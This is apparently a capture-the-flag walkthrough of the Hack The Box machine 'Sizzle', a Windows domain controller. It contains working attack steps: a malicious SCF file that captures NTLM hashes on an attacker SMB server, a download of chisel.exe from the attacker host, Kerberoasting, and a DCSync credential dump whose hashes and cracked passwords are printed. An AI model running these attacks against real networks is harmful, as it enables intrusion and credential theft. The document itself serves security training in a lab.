
## Port Scan

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -sS --min-rate 5000 -vvv -n -Pn --open -p- htb.local -oG targeted         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 04:42 EST
Initiating SYN Stealth Scan at 04:42
Scanning htb.local (10.129.85.49) [65535 ports]
Discovered open port 443/tcp on 10.129.85.49
Discovered open port 80/tcp on 10.129.85.49
Discovered open port 53/tcp on 10.129.85.49
Discovered open port 139/tcp on 10.129.85.49
Discovered open port 445/tcp on 10.129.85.49
Discovered open port 135/tcp on 10.129.85.49
Discovered open port 21/tcp on 10.129.85.49
Discovered open port 49686/tcp on 10.129.85.49
Discovered open port 49665/tcp on 10.129.85.49
Discovered open port 464/tcp on 10.129.85.49
Discovered open port 49671/tcp on 10.129.85.49
Discovered open port 5985/tcp on 10.129.85.49
Discovered open port 593/tcp on 10.129.85.49
Discovered open port 636/tcp on 10.129.85.49
Discovered open port 49693/tcp on 10.129.85.49
Discovered open port 49668/tcp on 10.129.85.49
Discovered open port 49666/tcp on 10.129.85.49
Discovered open port 47001/tcp on 10.129.85.49
Discovered open port 3269/tcp on 10.129.85.49
Discovered open port 49690/tcp on 10.129.85.49
Discovered open port 49687/tcp on 10.129.85.49
Discovered open port 49715/tcp on 10.129.85.49
Discovered open port 389/tcp on 10.129.85.49
Discovered open port 49664/tcp on 10.129.85.49
Discovered open port 5986/tcp on 10.129.85.49
Discovered open port 3268/tcp on 10.129.85.49
Discovered open port 49740/tcp on 10.129.85.49
Discovered open port 49709/tcp on 10.129.85.49
Discovered open port 9389/tcp on 10.129.85.49
Completed SYN Stealth Scan at 04:43, 26.44s elapsed (65535 total ports)
Nmap scan report for htb.local (10.129.85.49)
Host is up, received user-set (0.069s latency).
Scanned at 2025-01-18 04:42:36 EST for 26s
Not shown: 65506 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49687/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49709/tcp open  unknown          syn-ack ttl 127
49715/tcp open  unknown          syn-ack ttl 127
49740/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds
           Raw packets sent: 131053 (5.766MB) | Rcvd: 60 (4.373KB)
```
## Services and versions

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -sCV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49668,49671,49688,49689,49692,49695,49710,49714,49739 htb.local -oN webScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 04:44 EST
Nmap scan report for htb.local (10.129.85.49)
Host is up (0.076s latency).

PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2025-01-18T09:46:44+00:00; +53s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
443/tcp   open     ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-01-18T09:46:44+00:00; +54s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-title: Site doesn't have a title (text/html).
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2025-01-18T09:46:44+00:00; +54s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2025-01-18T09:46:44+00:00; +53s from scanner time.
3269/tcp  open     ssl/ldap
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2025-01-18T09:46:44+00:00; +54s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open     ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2025-01-18T09:46:44+00:00; +54s from scanner time.
9389/tcp  open     mc-nmf        .NET Message Framing
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49688/tcp filtered unknown
49689/tcp filtered unknown
49692/tcp filtered unknown
49695/tcp filtered unknown
49710/tcp filtered unknown
49714/tcp filtered unknown
49739/tcp filtered unknown
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 53s, deviation: 0s, median: 53s
| smb2-time: 
|   date: 2025-01-18T09:46:06
|_  start_date: 2025-01-18T06:37:58
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.27 seconds
```

We see much ports, we can to start with smb enumerating shares.

![image](https://github.com/user-attachments/assets/92931d71-8c96-417b-a5f7-b98a17c44eaf)

There's a interesant share called `Department Shares`.
We can to create a mount to we move more comfortably in our system.

![image](https://github.com/user-attachments/assets/0a9c85e7-af5b-467b-ab1b-de75de9558d9)

if we list directories and files with tree, we will see a folder called `Users` containing possible usernames from the Active directory.

```
┌──(root㉿kali)-[/mnt/montura]
└─# tree -fas
[      24576]  .
├── [          0]  ./Accounting
├── [          0]  ./Audit
├── [          0]  ./Banking
│   └── [          0]  ./Banking/Offshore
│       ├── [          0]  ./Banking/Offshore/Clients
│       ├── [          0]  ./Banking/Offshore/Data
│       ├── [          0]  ./Banking/Offshore/Dev
│       ├── [          0]  ./Banking/Offshore/Plans
│       └── [          0]  ./Banking/Offshore/Sites
├── [          0]  ./CEO_protected
├── [          0]  ./Devops
├── [          0]  ./Finance
├── [          0]  ./HR
│   ├── [          0]  ./HR/Benefits
│   ├── [          0]  ./HR/Corporate Events
│   ├── [          0]  ./HR/New Hire Documents
│   ├── [          0]  ./HR/Payroll
│   └── [          0]  ./HR/Policies
├── [          0]  ./Infosec
├── [          0]  ./Infrastructure
├── [          0]  ./IT
├── [          0]  ./Legal
├── [          0]  ./M&A
├── [          0]  ./Marketing
├── [          0]  ./R&D
├── [          0]  ./Sales
├── [          0]  ./Security
├── [          0]  ./Tax
│   ├── [          0]  ./Tax/2010
│   ├── [          0]  ./Tax/2011
│   ├── [          0]  ./Tax/2012
│   ├── [          0]  ./Tax/2013
│   ├── [          0]  ./Tax/2014
│   ├── [          0]  ./Tax/2015
│   ├── [          0]  ./Tax/2016
│   ├── [          0]  ./Tax/2017
│   └── [          0]  ./Tax/2018
├── [          0]  ./Users
│   ├── [          0]  ./Users/amanda
│   ├── [          0]  ./Users/amanda_adm
│   ├── [          0]  ./Users/bill
│   ├── [          0]  ./Users/bob
│   ├── [          0]  ./Users/chris
│   ├── [          0]  ./Users/henry
│   ├── [          0]  ./Users/joe
│   ├── [          0]  ./Users/jose
│   ├── [          0]  ./Users/lkys37en
│   ├── [          0]  ./Users/morgan
│   ├── [          0]  ./Users/mrb3n
│   └── [          0]  ./Users/Public
└── [          0]  ./ZZ_ARCHIVE
    ├── [     419430]  ./ZZ_ARCHIVE/AddComplete.pptx
    ├── [     419430]  ./ZZ_ARCHIVE/AddMerge.ram
    ├── [     419430]  ./ZZ_ARCHIVE/ConfirmUnprotect.doc
    ├── [     419430]  ./ZZ_ARCHIVE/ConvertFromInvoke.mov
    ├── [     419430]  ./ZZ_ARCHIVE/ConvertJoin.docx
    ├── [     419430]  ./ZZ_ARCHIVE/CopyPublish.ogg
    ├── [     419430]  ./ZZ_ARCHIVE/DebugMove.mpg
    ├── [     419430]  ./ZZ_ARCHIVE/DebugSelect.mpg
    ├── [     419430]  ./ZZ_ARCHIVE/DebugUse.pptx
    ├── [     419430]  ./ZZ_ARCHIVE/DisconnectApprove.ogg
    ├── [     419430]  ./ZZ_ARCHIVE/DisconnectDebug.mpeg2
    ├── [     419430]  ./ZZ_ARCHIVE/EditCompress.xls
    ├── [     419430]  ./ZZ_ARCHIVE/EditMount.doc
    ├── [     419430]  ./ZZ_ARCHIVE/EditSuspend.mp3
    ├── [     419430]  ./ZZ_ARCHIVE/EnableAdd.pptx
    ├── [     419430]  ./ZZ_ARCHIVE/EnablePing.mov
    ├── [     419430]  ./ZZ_ARCHIVE/EnableSend.ppt
    ├── [     419430]  ./ZZ_ARCHIVE/EnterMerge.mpeg
    ├── [     419430]  ./ZZ_ARCHIVE/ExitEnter.mpg
    ├── [     419430]  ./ZZ_ARCHIVE/ExportEdit.ogg
    ├── [     419430]  ./ZZ_ARCHIVE/GetOptimize.pdf
    ├── [     419430]  ./ZZ_ARCHIVE/GroupSend.rm
    ├── [     419430]  ./ZZ_ARCHIVE/HideExpand.rm
    ├── [     419430]  ./ZZ_ARCHIVE/InstallWait.pptx
    ├── [     419430]  ./ZZ_ARCHIVE/JoinEnable.ram
    ├── [     419430]  ./ZZ_ARCHIVE/LimitInstall.doc
    ├── [     419430]  ./ZZ_ARCHIVE/LimitStep.ppt
    ├── [     419430]  ./ZZ_ARCHIVE/MergeBlock.mp3
    ├── [     419430]  ./ZZ_ARCHIVE/MountClear.mpeg2
    ├── [     419430]  ./ZZ_ARCHIVE/MoveUninstall.docx
    ├── [     419430]  ./ZZ_ARCHIVE/NewInitialize.doc
    ├── [     419430]  ./ZZ_ARCHIVE/OutConnect.mpeg2
    ├── [     419430]  ./ZZ_ARCHIVE/PingGet.dot
    ├── [     419430]  ./ZZ_ARCHIVE/ReceiveInvoke.mpeg2
    ├── [     419430]  ./ZZ_ARCHIVE/RemoveEnter.mpeg3
    ├── [     419430]  ./ZZ_ARCHIVE/RemoveRestart.mpeg
    ├── [     419430]  ./ZZ_ARCHIVE/RequestJoin.mpeg2
    ├── [     419430]  ./ZZ_ARCHIVE/RequestOpen.ogg
    ├── [     419430]  ./ZZ_ARCHIVE/ResetCompare.avi
    ├── [     419430]  ./ZZ_ARCHIVE/ResetUninstall.mpeg
    ├── [     419430]  ./ZZ_ARCHIVE/ResumeCompare.doc
    ├── [     419430]  ./ZZ_ARCHIVE/SelectPop.ogg
    ├── [     419430]  ./ZZ_ARCHIVE/SuspendWatch.mp4
    ├── [     419430]  ./ZZ_ARCHIVE/SwitchConvertFrom.mpg
    ├── [     419430]  ./ZZ_ARCHIVE/UndoPing.rm
    ├── [     419430]  ./ZZ_ARCHIVE/UninstallExpand.mp3
    ├── [     419430]  ./ZZ_ARCHIVE/UnpublishSplit.ppt
    ├── [     419430]  ./ZZ_ARCHIVE/UnregisterPing.pptx
    ├── [     419430]  ./ZZ_ARCHIVE/UpdateRead.mpeg
    ├── [     419430]  ./ZZ_ARCHIVE/WaitRevoke.pptx
    └── [     419430]  ./ZZ_ARCHIVE/WriteUninstall.mp3

52 directories, 51 files
```

This is interesant, because if we have `write permission` in one of the folders we can to try a `SCF attack` uploading a malicious `scf` file.

To check this we can see the `ACL` that we have on the directory, we will create a `for` loop and we will interact with the different directories in `Users`. if we see that we have `Everyone -> Full` we will be able to write in it.

``` 
for i in $(ls Users); do perm=$(smbcacls "//htb.local/Department Shares" Users/$i -N | grep Everyone) | echo "$i we have $perm"
```

![image](https://github.com/user-attachments/assets/708358c5-3a0e-4cce-a444-17afeb233086)

`Public` have `Full`, we can to write in it. We will try to upload `SCF` file and get the `TGT`. The sintax of the scf file is the next.

```
[Shell]
Command=2
IconFile=\\10.10.16.7\smbFolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Once the file has been uploaded, if any user tries to access to the file, it will try to load IconFile from  `\\10.10.16.7\smbFolder\pentestlab.ico`, this will cause us to receive an smb connection with the user's `Net NTML v2`.

```
┌──(root㉿kali)-[/home/kali]
└─# python3 smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.142.24,64395)
[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
[*] User SIZZLE\amanda authenticated successfully
[*] amanda::HTB:aaaaaaaaaaaaaaaa:8efeb285ebe3e7743f1af64dfe53b0cf:010100000000000000295999f467db018cdd238e87947c060000000001001000540071004400700068004c005a00740003001000540071004400700068004c005a00740002001000630057007300610064006c0072004e0004001000630057007300610064006c0072004e000700080000295999f467db01060004000200000008003000300000000000000001000000002000002973092de2f85d101f0c9c1e368f9f38d9856bb9fbed9077c026dc999fe5b4530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003700000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.129.142.24,64395)
[*] Remaining connections []
```

We can to crack this hash with `john` using `rockyou.txt`.

`$ john --wordlist=/usr/share/wordlists/rockyou.txt hash`

![image](https://github.com/user-attachments/assets/a3dff90d-4b1e-4ac3-b1fb-bf5115c81437)

The credential is `Ashare1972`, if we will try to connect us in `WinRM` service, we will see that have a mistake.

![image](https://github.com/user-attachments/assets/d33598f5-1a29-410f-b513-f2d0bf258c7f)

This problem happens it because isn't allowed to connect just with credentials, we need to connect with public and private key. This is a more secure way to connect to WinRM.

So if we recall, there was a share called `Cert Enroll` in Samba.

![image](https://github.com/user-attachments/assets/2e1e6123-8be4-4ce8-8e13-8629e86a5de7)

We are facing IIS. We will try do a fuzzing with this wordlist [IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/IIS.fuzz.txt).

```
┌──(root㉿kali)-[/home/kali/HTB/Sizzle]
└─# wfuzz -c --hc=404 -u http://htb.local/FUZZ -w IIS.fuzz.txt                                      
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://htb.local/FUZZ
Total requests: 214

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                         
=====================================================================

000000031:   401        29 L     100 W      1293 Ch     "certsrv/mscep_admin"                                                           
000000030:   401        29 L     100 W      1293 Ch     "certsrv/"                                                                      
000000032:   401        29 L     100 W      1293 Ch     "certsrv/mscep/mscep.dll"                                                       
000000029:   403        29 L     92 W       1233 Ch     "certenroll/"
```

We found `certsrv/` with `401 Unauthorized` meaning there is a login form.

![image](https://github.com/user-attachments/assets/814c89d8-bb1e-46ca-bc41-fb7a77dba1ba)

if we try `amanda:Ashare1972` we will see that it works. This is because its configured with domain users. 

![image](https://github.com/user-attachments/assets/126f468a-2496-4061-ad97-be378260b038)

We have a `Active Directory Certificat Services`.

![image](https://github.com/user-attachments/assets/0ba079bc-faa2-46ac-a37d-ff68c822040b)

We can create a Public Key needed to access WinRM with `evil-winrm`.

![image](https://github.com/user-attachments/assets/26cf7a2f-f434-4e57-b2a5-96cc020dc905)

![image](https://github.com/user-attachments/assets/39c91fd6-1fde-4898-82c4-5c1eece39baa)

Now, we need to create a private key and copy CSR file to create a valid public key.

```
┌──(root㉿kali)-[/home/kali/HTB/Sizzle]
└─# openssl req -newkey rsa:2048 -nodes -keyout private.key -out file.csr  
.........+..........+...+......+++++++++++++++++++++++++++++++++++++++*...+++++++++++++++++++++++++++++++++++++++*.........+...........+.......+.....+...+....+.....+......+..........+.........+..............++++++
..+.............+..+....+...+..+++++++++++++++++++++++++++++++++++++++*....+.....+.+.....+++++++++++++++++++++++++++++++++++++++*......+........+......+...+.+..............+.++++++
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:extra
An optional company name []:

```

We paste the contents of the CSR file to request a public key.

![image](https://github.com/user-attachments/assets/8fd97a80-e3be-4258-addf-311e90cf0e6b)

Now we can to download certificate.

![image](https://github.com/user-attachments/assets/74ee05b3-92c1-483d-9da7-6ace071fd960)

Now we can to log in with `evil-winrm` using public and private key.

![image](https://github.com/user-attachments/assets/6cb9dfbd-b9ea-46fb-912e-4fc2d7355942)

And we are satisfactorily inside.

There is nothing on the machine that could be escalated.

Something that catches my attention is that it does not have an external kerberos port but yes internal.

![image](https://github.com/user-attachments/assets/878f8e01-ab31-4c70-b87e-4d34131e60c0)

We have valid credentials, we could try a kerberoasting attack, but we need to have port 88 available externally or we could use `Rubeus.exe`. I prefer to do port forwarding of port 88 with chisel and perform the attack with `GetUserSPN.py`.

I transferred `chisel.exe` to windows machine and ran it. 

```
┌──(root㉿kali)-[/home/kali/HTB/Sizzle]
└─# python3 -m http.server 8000                                                 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.85.49 - - [18/Jan/2025 04:04:16] "GET /chisel.exe HTTP/1.1" 200 -
```

```
*Evil-WinRM* PS C:\Windows\Temp> iwr -uri http://10.10.16.7:8000/chisel.exe -OutFile chisel.exe
*Evil-WinRM* PS C:\Windows\Temp> 
```

I Started a chisel server on my kali.

![image](https://github.com/user-attachments/assets/d747376c-eae6-4ed2-87f1-1edf082cfc39)

Now i connected with windows chisel to my kali server.

```
*Evil-WinRM* PS C:\Windows\Temp> .\chisel.exe client 10.10.16.7:1234 R:88:localhost:88 R:389:localhost:389 R:3268:localhost:3268
2025/01/18 04:10:13 client: Connected (Latency 79.3414ms)
```

Note: We need to redirect port 88 and also 389, 3268 of ldap to be able to do the kerberoasting attack.

We run `GetUserSPN.py` to do Kerberoasting attack.

```
┌──(root㉿kali)-[/home/kali/HTB/Sizzle]
└─# python3 GetUserSPNs.py htb.local/amanda:Ashare1972 -request -dc-ip 127.0.0.1
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name   MemberOf                                               PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  -----------------------------------------------------  --------------------------  --------------------------  ----------
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09.536421  2018-07-12 10:23:50.871575             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*mrlky$HTB.LOCAL$htb.local/mrlky*$a0bb9139cd176a467e52967c1f6e1bdc$bb14244df194607549d4acd8f5befc02dad596cf92d6a0e03d59fe6a241de603574ab3ab6bfa90d411e01535295f621fc13465be9e00cb232330fe9fbfbbd39c86b959730ce8294c6c0581dccc2ef1d925cf138ae0f0cf1f6a66056d850eed4cdbaedd1332418cae27567968df4742ef70b607703059ea75f6a13d46d0f89288a63a4016fd212ac06e46b8a1e77c698f0061f239c6a4142639f5e9063c0d07164144b92273756b15460e0b0160aa44e5497476525b286ced8d9deb373956e3bacbf289ce875bbc8387232d0cc25cf70af4f3a89d29dadbd626f2b510c16c132c3db0c976afad79cfc3e37bacf71c3802726e67be72c7c7c9ee35ed13697de201f816b0a1a683539e6c477b7e88096d4b2c324bf387d300211907418837bf48c54cb540e638e19d13463973f630928eb3b38e190d272d05333b52a51bcad2406de2c62a8aad99ef58ab6e60ced4a77a1a8691c1fb0d53f26642b74cd496c0faa688168150a9d052c92a194a98b1ec01502730ce57035ef22d649305517f65e6af84d1a1f70eefea2156a4c3e72d42e84650749efdbec3929d0ae1d34401658ccc2a0c72502210f0f926684a87b4bca0c7f791ebecdfaa477bf14ecbfd6a72cd8e85ccf2da6e65111185f7b94e5ca154510cb73d5c9e863a269553ab6b7911eb2457a78714569385d65e43b2e62719614ccd1452c550fa8535cead1866dd4896369a0b11a6194fb4dabcdc7bbdfd75aa6e3f58f5c9e295566f2d9f0d2a1f6e9f9ae700e344de6437ad71d5e59c4bf488a1c40ac60997b29b5fcc60ff82e1d52212c380c30715045fa0ee791054670fabb09aaf0816d55aa4b2e9abe04c03dd66604d2c390a9cdd2b3671bc555a72144790289d5a63534da6d4f72d36a070d8ef7c03e31c7efc913bf740e3d39324c5228f66ba2a5a4c7540e30bae033a32f46317a8645415133b2876428270d6d8a81f883c451e5dde453ea4803aec60c9461e8634498d5c74927b4b02362437122d858d42e9611f0524be3b51e95d0fa21dd1e2024afe8b08b08bb1ba0a5f11f37c2acce786389a3b7118bbed67f73d42d0d0ffe27c17961be7dd4277fcd3f65c8e24ad62591f91dd0fd543f5ea92cbffec5b51419a26f2eefc400a174ae4f8fc041636b0977b0ca8fd37e638ea5adc104e346d88d39c99cc3ce6115803c18f52a689a4f51060ea155102c348b6eb584cafceaa90ddbd0ee9f6fc8c7a4ba337b4857c990120641cab42d617

```

We see that `mrlky` was kerberoastable user. We have his TGS and we can to crack with `john`.

```
┌──(root㉿kali)-[/home/kali/HTB/Sizzle]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashkerberos 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)     
1g 0:00:00:12 DONE (2025-01-18 04:18) 0.07727g/s 863000p/s 863000c/s 863000C/s Forever3!..FokinovaS1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password is `Football#7` for user `mrlky`. If we run `bloodhound-python` we can see the quickest way to become a domain admin through the user `mrlky`.

```
┌──(root㉿kali)-[/home/kali/HTB/Sizzle]
└─# bloodhound-python -c All -u 'amanda' -p 'Ashare1972' -ns 10.129.85.49 -d htb.local
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (sizzle.HTB.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 8 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: Done in 00M 21S
```
![image](https://github.com/user-attachments/assets/b843926e-d669-41ed-9a17-115511a64b34)

User `mrlky` can do `DCSync attack` because have `Get-Changes` and `Get-Changes-All` privileges.

We can use `secretsdump.py` to do the attack.

```
┌──(root㉿kali)-[/home/kali/HTB/Sizzle]
└─# ./secretsdump.py 'htb.local'/'mrlky':'Football#7'@'htb.local'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:bafeafd0b1c2b54fb9a27c48aa3e7d7d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:878ef2c25c2ebde999cb32d5a1f06376ca92959eaac7bdad28d06eebf14ba5f9
SIZZLE$:aes128-cts-hmac-sha1-96:b8cc870b384704bba55d725e31d78c14
SIZZLE$:des-cbc-md5:c86846c83d947c2a
[*] Cleaning up...
```

Now we can simply pass the hash with `psexec` or `pth-winexe`.

![image](https://github.com/user-attachments/assets/99d0c99c-bb40-434b-a417-357b5595e233)
